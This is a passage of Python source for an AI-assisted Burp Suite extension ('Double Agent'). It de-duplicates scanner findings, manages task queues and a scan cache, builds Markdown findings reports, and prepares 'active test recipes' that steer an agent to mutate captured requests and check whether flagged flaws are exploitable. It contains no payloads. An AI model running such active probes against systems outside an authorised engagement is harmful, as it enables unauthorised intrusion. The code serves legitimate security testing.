                        queued_tasks += 1
                    if str(task.get("type", "")) == "PROXY" and not self._is_terminal_status(status):
                        proxy_tasks += 1
            with self.findings_lock_ui:
                findings_count = len(self.findings_list)
            with self.console_lock:
                console_count = len(self.console_messages)
            with self.agent_queue_lock:
                agent_count = len(self.agent_queue)
            return "tasks=%d active_tasks=%d queued_tasks=%d proxy_tasks=%d findings=%d console=%d agent_queue=%d active_threads=%d refresh_pending=%s dirty=%s" % (
                total_tasks, active_tasks, queued_tasks, proxy_tasks, findings_count, console_count,
                agent_count, int(getattr(self, "_active_analysis_threads", 0)),
                str(getattr(self, "_refresh_pending", False)), str(getattr(self, "_ui_dirty", False)))
        except Exception as e:
            return "snapshot_error=%s" % self._safe_ascii_text(e, 200)

    def _navigate_to_url(self, url):
        """Navigate to a URL in Burp Suite by searching proxy history"""
        try:
            self.stdout.println("[FINDINGS] Navigating to: %s" % url[:80])
            
            # Search proxy history for matching URL
            history = self.callbacks.getProxyHistory()
            if not history:
                self.stdout.println("[FINDINGS] No proxy history available")
                return
            
            # Look for exact match first, then partial
            best_match = None
            for entry in reversed(history):  # Start from most recent
                try:
                    req = self.helpers.analyzeRequest(entry)
                    entry_url = str(req.getUrl())
                    if entry_url == url:
                        best_match = entry
                        break
                    # Partial match: URL contains our target
                    if url in entry_url or entry_url in url:
                        if not best_match:
                            best_match = entry
                except:
                    continue
            
            if best_match:
                # Send to Repeater
                http_service = best_match.getHttpService()
                request = best_match.getRequest()
                if http_service and request:
                    self.callbacks.sendToRepeater(
                        http_service.getHost(),
                        http_service.getPort(),
                        http_service.getProtocol() == "https",
                        request,
                        "Double Agent Finding"
                    )
                    self.stdout.println("[FINDINGS] Sent to Repeater: %s" % url[:60])
            else:
                self.stdout.println("[FINDINGS] Request not found in proxy history")
                # Try to open URL in browser as fallback
                try:
                    from java.awt import Desktop
                    from java.net import URI
                    if Desktop.isDesktopSupported():
                        Desktop.getDesktop().browse(URI(url))
                        self.stdout.println("[FINDINGS] Opened in browser")
                except:
                    pass
                    
        except Exception as e:
            self.stderr.println("[FINDINGS] Navigation error: %s" % self._safe_ascii_text(e))

    def _normalize_finding_key(self, title):
        """Extract significant words from a finding title for fuzzy dedup."""
        title = str(title or "").lower()
        # Remove common filler words and punctuation
        noise = set(["in", "the", "a", "an", "of", "on", "for", "with", "and", "or",
                      "to", "is", "are", "be", "by", "as", "at", "from", "via", "into",
                      "not", "no", "its", "it", "this", "that", "has", "have", "been",
                      "may", "can", "could", "should", "will", "would", "does", "do",
                      "between", "through", "during", "before", "after", "using",
                      "request", "response", "endpoint", "header", "body", "found",
                      "detected", "identified", "observed", "exposed", "present",
                      "potential", "possible", "string", "value", "field", "data",
                      "api", "url", "path", "query", "parameter", "parameters"])
        # Strip punctuation
        clean = re.sub(r'[^a-z0-9\s]', ' ', title)
        words = set(w for w in clean.split() if w and len(w) > 2 and w not in noise)
        return frozenset(words)

    def _canonical_scanner_title(self, title):
        title_l = str(title or "").lower()
        title_l = title_l.replace("(burp scanner)", "")
        title_l = re.sub(r'[^a-z0-9\s]', ' ', title_l)
        title_l = re.sub(r'\s+', ' ', title_l).strip()
        # Burp emits variants such as "Cross-origin resource sharing
        # (reflected)"; these are one scanner issue class for reporting.
        if title_l.startswith("cross origin resource sharing"):
            return "cross origin resource sharing"
        return title_l

    def _url_host(self, url):
        try:
            try:
                from urlparse import urlparse as _urlparse
            except ImportError:
                from urllib.parse import urlparse as _urlparse
            return (_urlparse(str(url or "")).hostname or "").lower()
        except:
            return ""

    def _is_scanner_finding(self, title, source=""):
        return str(source or "") == "burp_scanner" or str(title or "").lower().startswith("(burp scanner)")

    def _scanner_dedupe_key(self, url, title, source=""):
        if not self._is_scanner_finding(title, source):
            return None
        canon_title = self._canonical_scanner_title(title)
        if not canon_title:
            return None
        # Configuration-style scanner findings create lots of endpoint-level
        # duplicates. Keep one row and let details/triage explain affected area.
        global_issue_titles = set([
            "cross origin resource sharing",
            "strict transport security not enforced",
            "strict transport security disabled",
            "content security policy not enforced",
            "x frame options header not set",
            "x content type options header missing",
        ])
        if canon_title in global_issue_titles:
            return "scanner:global:%s" % canon_title
        host = self._url_host(url)
        return "scanner:%s:%s" % (host, canon_title)

    def _is_duplicate_finding(self, url, title, cwe, source=""):
        """Check if a semantically similar finding already exists for this URL."""
        scanner_key = self._scanner_dedupe_key(url, title, source)
        if scanner_key:
            for existing in self.findings_list:
                if self._scanner_dedupe_key(existing.get("url", ""), existing.get("title", ""), existing.get("source", "")) == scanner_key:
                    return True

        new_key = self._normalize_finding_key(title)
        if not new_key:
            return False

        for existing in self.findings_list:
            if existing.get("url") != url:
                continue

            # Exact CWE match on same URL is a duplicate
            if cwe and existing.get("cwe") and str(cwe) == str(existing.get("cwe")):
                return True

            existing_key = self._normalize_finding_key(existing.get("title", ""))
            if not existing_key:
                continue

            # Calculate word overlap ratio
            overlap = len(new_key & existing_key)
            smaller = min(len(new_key), len(existing_key))
            if smaller > 0 and float(overlap) / smaller >= 0.6:
                return True

        return False

    def _dedupe_existing_findings(self):
        """Collapse existing repeated scanner findings after loading persisted state."""
        seen = {}
        deduped = []
        removed = 0
        for finding in self.findings_list:
            key = self._scanner_dedupe_key(finding.get("url", ""), finding.get("title", ""), finding.get("source", ""))
            if key and key in seen:
                primary = seen[key]
                duplicate_url = finding.get("url", "")
                if duplicate_url and duplicate_url != primary.get("url", ""):
                    urls = primary.setdefault("duplicate_urls", [])
                    if duplicate_url not in urls:
                        urls.append(duplicate_url)
                primary["duplicate_count"] = int(primary.get("duplicate_count", 0) or 0) + 1
                removed += 1
                continue
            if key:
                seen[key] = finding
            deduped.append(finding)
        if removed:
            self.findings_list = deduped
        return removed

    def _agent_status_value(self, value):
        return str(value or "untouched").strip().lower().replace(" ", "_").replace("-", "_")

    def _finding_hidden_from_normal_view(self, finding):
        return bool(finding.get("fp", False)) or self._agent_status_value(
            finding.get("agent_status", "")) == "not_important"

    def _prune_already_covered_findings(self):
        """Remove findings already covered by completed work from the active list."""
        kept = []
        deleted_indices = []
        for idx, finding in enumerate(self.findings_list):
            if self._agent_status_value(finding.get("agent_status", "")) == "already_covered":
                deleted_indices.append(idx)
                continue
            kept.append(finding)
        if deleted_indices:
            self.findings_list = kept
        return deleted_indices

    def _remap_finding_ids_after_deleted_indices(self, old_ids, deleted_indices):
        deleted_sorted = sorted(set([int(i) for i in deleted_indices]), reverse=True)
        new_ids = []
        for fid in old_ids or []:
            try:
                fid_int = int(fid)
            except:
                continue
            remove_ref = False
            shift = 0
            for deleted_idx in deleted_sorted:
                if fid_int == deleted_idx:
                    remove_ref = True
                    break
                if fid_int > deleted_idx:
                    shift += 1
            if not remove_ref:
                new_ids.append(fid_int - shift)
        return new_ids

    def _recipe_text_value(self, recipe, fallback, names, limit=600):
        for source in (recipe, fallback):
            if not isinstance(source, dict):
                continue
            for name in names:
                value = source.get(name, None)
                if value is None:
                    continue
                text = self._safe_ascii_text(value, limit).strip()
                if text:
                    return text
        return ""

    def _recipe_bool_value(self, recipe, fallback, names, default=False):
        for source in (recipe, fallback):
            if not isinstance(source, dict):
                continue
            for name in names:
                if name not in source:
                    continue
                value = source.get(name)
                if isinstance(value, bool):
                    return bool(value)
                text = str(value or "").strip().lower()
                if text in ("1", "true", "yes", "y", "required", "needs_second_user"):
                    return True
                if text in ("0", "false", "no", "n", "none", "not_required"):
                    return False
        return bool(default)

    def _recipe_int_value(self, recipe, fallback, names, default=2, minimum=1, maximum=10):
        for source in (recipe, fallback):
            if not isinstance(source, dict):
                continue
            for name in names:
                if name not in source:
                    continue
                try:
                    value = int(source.get(name))
                    if value < minimum:
                        value = minimum
                    if value > maximum:
                        value = maximum
                    return value
                except:
                    pass
        return int(default)

    def _infer_active_test_type(self, title, cwe, detail):
        text = ("%s %s %s" % (title or "", cwe or "", detail or "")).lower()
        if "idor" in text or "authorization" in text or "access control" in text or "privilege" in text:
            return "authorization"
        if "auth bypass" in text or "authentication bypass" in text or "missing auth" in text:
            return "authentication"
        if "ssrf" in text or "server-side request forgery" in text:
            return "ssrf"
        if "sql" in text or "injection" in text or "sqli" in text:
            return "injection"
        if "xss" in text or "cross-site scripting" in text:
            return "xss"
        if "csrf" in text:
            return "csrf"
        if "race" in text or "business logic" in text or "workflow" in text:
            return "business_logic"
        if "token" in text or "jwt" in text or "session" in text:
            return "token_or_session"
        return "focused_validation"

    def _normalize_active_test_recipe(self, recipe, fallback=None):
        """Normalize the passive scanner's active-agent handoff recipe."""
        if fallback is None:
            fallback = {}
        if not isinstance(recipe, dict):
            recipe = {}
        if not isinstance(fallback, dict):
            fallback = {}

        title = self._recipe_text_value(recipe, fallback, ["title", "finding_title", "name"], 300)
        url = self._recipe_text_value(recipe, fallback, ["url", "endpoint"], 1000)
        detail = self._recipe_text_value(recipe, fallback, ["detail", "description"], 1000)
        cwe = self._recipe_text_value(recipe, fallback, ["cwe"], 100)
        status = self._recipe_text_value(recipe, fallback, ["agent_status", "triage_status", "status"], 100).lower()
        priority = self._recipe_text_value(recipe, fallback, ["agent_priority", "active_priority", "priority"], 100)
        rationale = self._recipe_text_value(recipe, fallback, ["agent_rationale", "triage_rationale", "rationale"], 1200)

        active_test_type = self._recipe_text_value(
            recipe, fallback,
            ["active_test_type", "test_type", "vulnerability_class", "technique"],
            120
        )
        if not active_test_type:
            active_test_type = self._infer_active_test_type(title, cwe, detail)

        hypothesis = self._recipe_text_value(
            recipe, fallback,
            ["hypothesis", "active_hypothesis", "test_hypothesis"],
            800
        )
        if not hypothesis:
            if title and url:
                hypothesis = "Validate whether '%s' is exploitable at %s." % (title, url)
            elif title:
                hypothesis = "Validate whether '%s' is exploitable." % title

        why_now = self._recipe_text_value(recipe, fallback, ["why_now", "why_active", "why_test"], 800)
        if not why_now:
            why_now = rationale

        baseline_request = self._recipe_text_value(
            recipe, fallback,
            ["baseline_request", "baseline", "baseline_step"],
            800
        )
        if not baseline_request:
            baseline_request = "Replay the captured request once to confirm baseline status, auth context, and response shape."

        mutation_hint = self._recipe_text_value(
            recipe, fallback,
            ["mutation_hint", "mutation", "active_probe", "test_plan", "next_probe"],
            1000
        )
        if not mutation_hint:
            mutation_hint = "Mutate only the evidence-backed parameter, path segment, header, or body field that supports the finding; compare against the baseline."

        expected_vulnerable_signal = self._recipe_text_value(
            recipe, fallback,
            ["expected_vulnerable_signal", "vulnerable_signal", "success_signal", "expected_bad_signal"],
            800
        )
        if not expected_vulnerable_signal:
            expected_vulnerable_signal = "The mutated request returns unauthorized data, performs an unauthorized action, triggers execution, or otherwise changes security-relevant behavior from baseline."

        expected_safe_signal = self._recipe_text_value(
            recipe, fallback,
            ["expected_safe_signal", "safe_signal", "negative_signal", "expected_good_signal"],
            800
        )
        if not expected_safe_signal:
            expected_safe_signal = "The application rejects the mutation, returns 401/403/4xx, preserves ownership boundaries, or behaves no differently from the safe baseline."

        default_max = 2 if status == "needs_investigation" else 3
        max_requests = self._recipe_int_value(recipe, fallback, ["max_requests", "request_budget", "probe_budget"], default_max, 1, 10)

        text_for_identity = ("%s %s %s %s" % (title, detail, hypothesis, active_test_type)).lower()
        default_second_user = ("idor" in text_for_identity or "authorization" in text_for_identity or "access control" in text_for_identity)
        needs_second_user = self._recipe_bool_value(
            recipe, fallback,
            ["needs_second_user", "requires_second_user", "needs_other_user", "second_user_required"],
            default_second_user
        )

        safety_notes = self._recipe_text_value(recipe, fallback, ["safety_notes", "safety", "constraints"], 1000)
        if not safety_notes:
            safety_notes = "Respect queue safety_gate and scope_guard. Ask before destructive, payment, password, delete, upload, transfer, order, or admin actions."

        ready_for_active = bool(status in ("valid", "needs_investigation") and str(priority).lower() != "defer")

        if not hypothesis and not mutation_hint and not title:
            return {}

        return {
            "hypothesis": hypothesis,
            "why_now": why_now,
            "active_test_type": active_test_type,
            "baseline_request": baseline_request,
            "mutation_hint": mutation_hint,
            "expected_vulnerable_signal": expected_vulnerable_signal,
            "expected_safe_signal": expected_safe_signal,
            "max_requests": max_requests,
            "needs_second_user": bool(needs_second_user),
            "safety_notes": safety_notes,
            "ready_for_active": ready_for_active
        }

    def _build_report_markdown(self):
        """Generate findings.md-style markdown directly from findings_list.

        This is the single source of truth - the report is *derived* from
        the live findings table, not a separately maintained file.
        """
        include_fp = bool(getattr(self, "reportIncludeFP", None) and self.reportIncludeFP.isSelected())
        include_deferred = bool(getattr(self, "reportIncludeDeferred", None) and self.reportIncludeDeferred.isSelected())

        with self.findings_lock_ui:
            findings = list(self.findings_list)

        # Filter
        def _keep(f):
            if not include_fp and self._finding_hidden_from_normal_view(f):
                return False
            if not include_deferred and str(f.get("agent_priority", "")).lower() == "defer":
                return False
            return True
        findings = [f for f in findings if _keep(f)]

        # Severity ordering
        sev_rank = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Informational": 4, "Information": 4}
        findings.sort(key=lambda f: (sev_rank.get(self._safe_ascii_text(f.get("severity", ""), 100), 99),
                                     self._safe_ascii_text(f.get("title", ""), 500)))

        # Severity counts
        counts = {"Critical": 0, "High": 0, "Medium": 0, "Low": 0, "Informational": 0}
        confirmed = 0
        for f in findings:
            sev = self._safe_ascii_text(f.get("severity", ""), 100)
            if sev == "Information":
                sev = "Informational"
            if sev in counts:
                counts[sev] += 1
            if self._safe_ascii_text(f.get("agent_status", ""), 100).lower() in ("valid", "confirmed"):
                confirmed += 1

        lines = []
        lines.append("# Engagement Findings Report")
        lines.append("")
        lines.append("_Generated %s by Double Agent_" % datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
        lines.append("")
        lines.append("## Summary")
        lines.append("")
        lines.append("| Severity | Count |")
        lines.append("|----------|------:|")
        for sev in ["Critical", "High", "Medium", "Low", "Informational"]:
            lines.append("| %s | %d |" % (sev, counts.get(sev, 0)))
        lines.append("| **Total** | **%d** |" % len(findings))
        lines.append("")
        lines.append("Confirmed by agent: %d / %d" % (confirmed, len(findings)))
        lines.append("")

        if not findings:
            lines.append("_No findings to report._")
            return "\n".join(lines)

        lines.append("## Findings")
        lines.append("")

        for idx, f in enumerate(findings, 1):
            title = self._safe_ascii_text(f.get("title", "Untitled"), 500)
            sev = self._safe_ascii_text(f.get("severity", ""), 100)
            conf = self._safe_ascii_text(f.get("confidence", ""), 100)
            url = self._safe_ascii_text(f.get("url", ""), 2000)
            agent_status = self._safe_ascii_text(f.get("agent_status", "untouched"), 100)
            agent_priority = self._safe_ascii_text(f.get("agent_priority", ""), 100)
            agent_rationale = self._safe_ascii_text(f.get("agent_rationale", ""), 2000)
            source = self._safe_ascii_text(f.get("source", "double_agent_passive"), 200)

            lines.append("### %d. [%s] %s" % (idx, sev, title))
            lines.append("")
            lines.append("- **URL:** `%s`" % url)
            lines.append("- **Confidence:** %s" % conf)
            lines.append("- **Source:** %s" % source)
            if f.get("cwe"):
                lines.append("- **CWE:** %s" % self._safe_ascii_text(f.get("cwe"), 200))
            if f.get("owasp"):
                lines.append("- **OWASP:** %s" % self._safe_ascii_text(f.get("owasp"), 200))
            lines.append("- **Agent Status:** %s%s" % (
                agent_status,
                ((" / " + agent_priority) if agent_priority else "")))
            if agent_rationale:
                lines.append("- **Agent Rationale:** %s" % agent_rationale)
            recipe = f.get("active_test_recipe", {}) or {}
            if isinstance(recipe, dict) and recipe:
                lines.append("- **Active Test:** %s, max %s request(s), second user: %s" % (
                    self._safe_ascii_text(recipe.get("active_test_type", ""), 120),
                    self._safe_ascii_text(recipe.get("max_requests", ""), 20),
                    self._safe_ascii_text(recipe.get("needs_second_user", ""), 20)))
                if recipe.get("hypothesis"):
                    lines.append("- **Hypothesis:** %s" % self._safe_ascii_text(recipe.get("hypothesis", ""), 1200))
                if recipe.get("mutation_hint"):
                    lines.append("- **Mutation Hint:** %s" % self._safe_ascii_text(recipe.get("mutation_hint", ""), 1200))
                if recipe.get("expected_vulnerable_signal"):
                    lines.append("- **Vulnerable Signal:** %s" % self._safe_ascii_text(recipe.get("expected_vulnerable_signal", ""), 1000))
                if recipe.get("expected_safe_signal"):
                    lines.append("- **Safe Signal:** %s" % self._safe_ascii_text(recipe.get("expected_safe_signal", ""), 1000))
            if f.get("discovered_at"):
                lines.append("- **Discovered:** %s" % self._safe_ascii_text(f.get("discovered_at"), 100))
            lines.append("")

            detail = self._safe_ascii_text(f.get("detail", "") or "", 4000)
            if detail.strip():
                lines.append("**Detail:**")
                lines.append("")
                lines.append("```")
                lines.append(detail.strip())
                lines.append("```")
                lines.append("")

            evidence = self._safe_ascii_text(f.get("evidence", "") or "", 2000)
            if evidence.strip():
                lines.append("**Evidence:**")
                lines.append("")
                lines.append("```")
                lines.append(evidence.strip())
                lines.append("```")
                lines.append("")

            remediation = self._safe_ascii_text(f.get("remediation", "") or "", 2000)
            if remediation.strip():
                lines.append("**Remediation:**")
                lines.append("")
                lines.append(remediation.strip())
                lines.append("")

            lines.append("---")
            lines.append("")

        return "\n".join(lines)

    def _refreshReportTab(self):
        """Re-render the Report tab from current findings_list state, if present."""
        try:
            if not getattr(self, "reportTextArea", None):
                return
            md = self._build_report_markdown()
            self.reportTextArea.setText(md)
            self.reportTextArea.setCaretPosition(0)
        except Exception as e:
            self.stderr.println("[REPORT] Refresh error: %s" % self._safe_ascii_text(e))

    def _copyDoubleAgentApiToken(self):
        """Copy 'Double Agent API Token: <token>' (the full label + value) to the clipboard."""
        try:
            from java.awt import Toolkit
            from java.awt.datatransfer import StringSelection
            token = ""
            try:
                token = str(self.agentTokenField.getText() or "")
            except Exception:
                token = str(getattr(self, "agent_api_token", "") or "")
            text = "Double Agent API Token: %s" % token
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(text), None)
            self.log_to_console("[AGENT API] Copied to clipboard: %s" % text)
            # Visual feedback: temporarily change button text to "Copied"
            try:
                btn = getattr(self, "agentCopyTokenBtn", None)
                if btn is not None:
                    original_text = btn.getText()
                    btn.setText("Copied")
                    from javax.swing import Timer
                    def _restore(event):
                        btn.setText(original_text)
                    t = Timer(2000, _restore)
                    t.setRepeats(False)
                    t.start()
            except Exception:
                pass
        except Exception as e:
            self.stderr.println("[AGENT API] Copy token error: %s" % self._safe_ascii_text(e))

    def _copyReportToClipboard(self):
        try:
            from java.awt import Toolkit
            from java.awt.datatransfer import StringSelection
            md = self._build_report_markdown()
            Toolkit.getDefaultToolkit().getSystemClipboard().setContents(StringSelection(md), None)
            self.log_to_console("[REPORT] Copied %d chars to clipboard" % len(md))
        except Exception as e:
            self.stderr.println("[REPORT] Copy error: %s" % self._safe_ascii_text(e))

    def _saveReportToFile(self):
        try:
            from javax.swing import JFileChooser
            from java.io import File as _File
            chooser = JFileChooser()
            chooser.setSelectedFile(_File("findings.md"))
            ret = chooser.showSaveDialog(self.panel)
            if ret != JFileChooser.APPROVE_OPTION:
                return
            target = chooser.getSelectedFile()
            md = self._build_report_markdown()
            with open(target.getAbsolutePath(), "w") as fh:
                fh.write(md.encode("utf-8") if isinstance(md, unicode) else md)
            self.log_to_console("[REPORT] Saved %d chars to %s" % (len(md), target.getAbsolutePath()))
        except Exception as e:
            self.stderr.println("[REPORT] Save error: %s" % self._safe_ascii_text(e))

    def add_finding(self, url, title, severity, confidence, detail="", cwe="", evidence="", remediation="", owasp="", ai_confidence=0, request_data=None, response_data=None, source="double_agent_passive", raw_ai_confidence=None, agent_status="untouched", agent_priority="", agent_rationale="", active_test_recipe=None):
        with self.findings_lock_ui:
            fp_keys = self._get_fp_keys_for_finding(url, title, source)
            if any(fp_key in self.fp_suppressed for fp_key in fp_keys):
                if self.VERBOSE:
                    self.stdout.println("[FP] Suppressing known FP: %s" % self._safe_ascii_text(str(title)[:100]))
                return
            if self._is_duplicate_finding(url, title, cwe, source):
                if self.VERBOSE:
                    self.stdout.println("[DEDUP] Skipping duplicate finding: %s" % self._safe_ascii_text(str(title)[:100]))
                return
            active_test_recipe = self._normalize_active_test_recipe(active_test_recipe or {}, {
                "title": title,
                "url": url,
                "severity": severity,
                "detail": detail,
                "cwe": cwe,
                "agent_status": agent_status,
                "agent_priority": agent_priority,
                "agent_rationale": agent_rationale
            })
            finding = {
                "discovered_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "url": url,
                "title": title,
                "severity": severity,
                "confidence": confidence,
                "detail": detail,
                "cwe": cwe,
                "evidence": evidence,
                "remediation": remediation,
                "owasp": owasp,
                "ai_confidence": ai_confidence,
                "raw_ai_confidence": raw_ai_confidence if raw_ai_confidence is not None else ai_confidence,
                "fp": False,
                "agent_status": agent_status or "untouched",
                "agent_priority": agent_priority or "",
                "agent_rationale": agent_rationale or "",
                "active_test_recipe": active_test_recipe,
                "agent_updated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S") if agent_status and agent_status != "untouched" else "",
                "request_data": request_data,
                "response_data": response_data,
                "source": source
            }
            self.findings_list.append(finding)
        self.save_findings()
        self._ui_dirty = True
    
    def addTask(self, task_type, url, status="Queued", messageInfo=None, url_hash=None):
        with self.tasks_lock:
            task = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "type": task_type,
                "url": url,
                "status": status,
                "start_time": time.time(),
                "messageInfo": messageInfo,
                "url_hash": url_hash
            }
            self.tasks.append(task)
            task_id = len(self.tasks) - 1
        with self.stats_lock:
            self.stats["total_requests"] += 1
        self._ui_dirty = True
        return task_id

    def _is_terminal_status(self, status):
        status = str(status or "")
        return ("Completed" in status or
                "Error" in status or
                "Cancelled" in status or
                "Skipped" in status)

    def _task_type_for_id(self, task_id):
        if task_id is None:
            return ""
        try:
            with self.tasks_lock:
                if 0 <= task_id < len(self.tasks):
                    return str(self.tasks[task_id].get("type", ""))
        except:
            pass
        return ""

    def updateTask(self, task_id, status, error=None):
        with self.tasks_lock:
            if task_id < len(self.tasks):
                self.tasks[task_id]["status"] = status
                if self._is_terminal_status(status):
                    self.tasks[task_id]["end_time"] = time.time()
                elif "end_time" in self.tasks[task_id]:
                    del self.tasks[task_id]["end_time"]
                if error:
                    self.tasks[task_id]["error"] = error
        self._ui_dirty = True

    def _is_task_cancelled(self, task_id):
        if task_id is None:
            return False
        with self.tasks_lock:
            if task_id >= len(self.tasks):
                return True
            task = self.tasks[task_id]
            if task.get("cancel_requested"):
                return True
            status = str(task.get("status", ""))
            return "Cancelled" in status

    def _canonicalize_url_for_scan_cache(self, url):
        raw = str(url or "").strip()
        if not raw:
            return ""
        try:
            try:
                from urlparse import urlsplit, urlunsplit, parse_qsl
                from urllib import urlencode
            except:
                from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
            parts = urlsplit(raw)
            scheme = (parts.scheme or "").lower()
            netloc = (parts.netloc or "").lower()
            path = parts.path or "/"
            noisy_exact = set([
                "_", "t", "ts", "timestamp", "cachebust", "cachebuster",
                "cache_buster", "cb", "rnd", "random", "nonce", "nocache",
                "no_cache", "_dc"
            ])
            kept = []
            for key, value in parse_qsl(parts.query or "", keep_blank_values=True):
                key_l = str(key or "").lower()
                if key_l in noisy_exact or key_l.startswith("utm_"):
                    continue
                kept.append((key, value))
            kept.sort()
            query = urlencode(kept, doseq=True) if kept else ""
            return urlunsplit((scheme, netloc, path, "", query))
        except:
            # Fallback: still drop fragments so anchor changes do not rescan.
            return raw.split("#", 1)[0]

    def _passive_scan_record_ts(self, record):
        try:
            return float(record.get("completed_at_ts", record.get("failed_at_ts", record.get("updated_at_ts", 0))) or 0)
        except:
            return 0.0

    def _prune_passive_scan_cache_locked(self):
        try:
            max_entries = int(getattr(self, "PASSIVE_SCAN_CACHE_MAX_ENTRIES", 5000))
        except:
            max_entries = 5000
        cache = getattr(self, "passive_scan_cache", {}) or {}
        if len(cache) <= max_entries:
            return
        items = []
        for key, record in cache.items():
            items.append((self._passive_scan_record_ts(record), key))
        items.sort(reverse=True)
        keep = set([key for _ts, key in items[:max_entries]])
        for key in list(cache.keys()):
            if key not in keep:
                cache.pop(key, None)
                self.processed_urls.pop(key, None)

    def _load_passive_scan_cache(self, cache_doc):
        if not isinstance(cache_doc, dict):
            return
        now = time.time()
        loaded = 0
        completed = 0
        with self.url_lock:
            self.passive_scan_cache = {}
            for key, record in cache_doc.items():
                if not key or not isinstance(record, dict):
                    continue
                status = str(record.get("status", "")).lower()
                ts = self._passive_scan_record_ts(record)
                if ts <= 0:
                    continue
                if status == "completed" and now - ts > self.PROCESSED_URL_EXPIRY_SECONDS:
                    continue
                if status == "failed" and now - ts > self.PASSIVE_SCAN_FAILURE_RETRY_SECONDS:
                    continue
                self.passive_scan_cache[str(key)] = dict(record)
                loaded += 1
                if status == "completed":
                    self.processed_urls[str(key)] = ts
                    completed += 1
            self._prune_passive_scan_cache_locked()
        if loaded:
            self.stdout.println("[PASSIVE CACHE] Restored %d passive scan ledger entrie(s), %d completed" % (loaded, completed))

    def _recent_completed_scan_locked(self, url_hash):
        if not url_hash:
            return False
        now = time.time()
        ts = self.processed_urls.get(url_hash)
        if ts and now - ts < self.PROCESSED_URL_EXPIRY_SECONDS:
            return True
        record = self.passive_scan_cache.get(url_hash)
        if isinstance(record, dict) and str(record.get("status", "")).lower() == "completed":
            ts = self._passive_scan_record_ts(record)
            if ts and now - ts < self.PROCESSED_URL_EXPIRY_SECONDS:
                self.processed_urls[url_hash] = ts
                return True
        return False

    def _recent_failed_scan_retry_after_locked(self, url_hash):
        if not url_hash:
            return 0
        record = self.passive_scan_cache.get(url_hash)
        if not isinstance(record, dict) or str(record.get("status", "")).lower() != "failed":
            return 0
        ts = self._passive_scan_record_ts(record)
        if not ts:
            return 0
        remaining = int(self.PASSIVE_SCAN_FAILURE_RETRY_SECONDS - (time.time() - ts))
        return max(0, remaining)

    def _record_passive_scan_completed(self, url_hash, url_str, method, status_code, findings_count, created, skipped_dup, skipped_low_conf, ai_ms):
        if not url_hash:
            return
        now = time.time()
        record = {
            "status": "completed",
            "url": self._safe_ascii_text(url_str, 500),
            "method": self._safe_ascii_text(method, 20),
            "http_status": int(status_code or 0),
            "findings": int(findings_count or 0),
            "created": int(created or 0),
            "duplicates": int(skipped_dup or 0),
            "low_confidence": int(skipped_low_conf or 0),
            "ai_ms": int(ai_ms or 0),
            "completed_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "completed_at_ts": now
        }
        with self.url_lock:
            self.processed_urls[url_hash] = now
            self.passive_scan_cache[url_hash] = record
            self._prune_passive_scan_cache_locked()
        self._perf_debug(
            "passive cache completed hash=%s findings=%d created=%d url=%s" % (
                str(url_hash)[:10], int(findings_count or 0), int(created or 0), str(url_str)[:120]),
            key="passive-cache-complete", min_interval=1.0)
        self.save_findings()

    def _record_passive_scan_failure(self, url_hash, url_str, status, error_message):
        if not url_hash:
            return
        now = time.time()
        record = {
            "status": "failed",
            "url": self._safe_ascii_text(url_str, 500),
            "error_status": self._safe_ascii_text(status, 100),
            "error": self._safe_ascii_text(error_message, 500),
            "failed_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "failed_at_ts": now
        }
        with self.url_lock:
            self.passive_scan_cache[url_hash] = record
            self.processed_urls.pop(url_hash, None)
            self._prune_passive_scan_cache_locked()
        self._perf_debug(
            "passive cache retryable failure hash=%s status=%s retry_after=%ds url=%s" % (
                str(url_hash)[:10], self._safe_ascii_text(status, 100),
                int(self.PASSIVE_SCAN_FAILURE_RETRY_SECONDS), str(url_str)[:120]),
            key="passive-cache-failure", min_interval=1.0)
        self.save_findings()

    def _reserve_url_hash_for_queue(self, url_hash, source, url_str):
        self._last_reserve_skip_reason = ""
        if not url_hash:
            return True
        if source == "PROXY" and not getattr(self, "PROXY_DEDUPE_ENABLED", True):
            return True
        with self.url_lock:
            # Check if currently queued
            if url_hash in self.queued_url_hashes:
                self._last_reserve_skip_reason = "already_queued"
                if self.VERBOSE:
                    self.stdout.println("[%s] URL: %s - [SKIP] Already queued" % (source, url_str))
                return False
            # Check if processed within expiry window
            if self._recent_completed_scan_locked(url_hash):
                self._last_reserve_skip_reason = "already_completed"
                if self.VERBOSE:
                    self.stdout.println("[%s] URL: %s - [SKIP] Already analyzed (within %d min window)" % (source, url_str, self.PROCESSED_URL_EXPIRY_SECONDS / 60))
                return False
            retry_after = self._recent_failed_scan_retry_after_locked(url_hash)
            if retry_after > 0:
                self._last_reserve_skip_reason = "retry_cooldown"
                if self.VERBOSE:
                    self.stdout.println("[%s] URL: %s - [SKIP] Recent AI failure, retry after %ds" % (source, url_str, retry_after))
                return False
            self.queued_url_hashes.add(url_hash)
            return True

    def _release_task_url_hash(self, task_id):
        if task_id is None:
            return
        url_hash = None
        with self.tasks_lock:
            if task_id < len(self.tasks):
                url_hash = self.tasks[task_id].get("url_hash")
        if not url_hash:
            return
        with self.url_lock:
            self.queued_url_hashes.discard(url_hash)

    def _wait_if_paused_or_cancelled(self, task_id=None):
        while True:
            if self._is_task_cancelled(task_id):
                return False
            with self.control_lock:
                paused = self.pause_all
            if not paused:
                return True
            if task_id is not None:
                self.updateTask(task_id, "Paused")
            time.sleep(0.2)

    def _interruptible_sleep(self, total_seconds, task_id=None):
        remaining = float(total_seconds)
        while remaining > 0:
            if not self._wait_if_paused_or_cancelled(task_id):
                return False
            step = 0.2 if remaining > 0.2 else remaining
            time.sleep(step)
            remaining -= step
        return True

    def updateStats(self, stat_key, increment=1):
        with self.stats_lock:
            self.stats[stat_key] = self.stats.get(stat_key, 0) + increment
        # Stats are diagnostic-only in the current UI. Do not dirty the Swing UI
        # for high-volume proxy skips; findings/tasks already mark UI changes.

    def _estimate_token_count(self, text):
        if not text:
            return 0
        try:
            return max(1, int(len(text) / 4))
        except:
            return 0

    def _record_token_usage(self, prompt_tokens, completion_tokens):
        try:
            prompt_tokens = int(prompt_tokens) if prompt_tokens is not None else 0
        except:
            prompt_tokens = 0
        try:
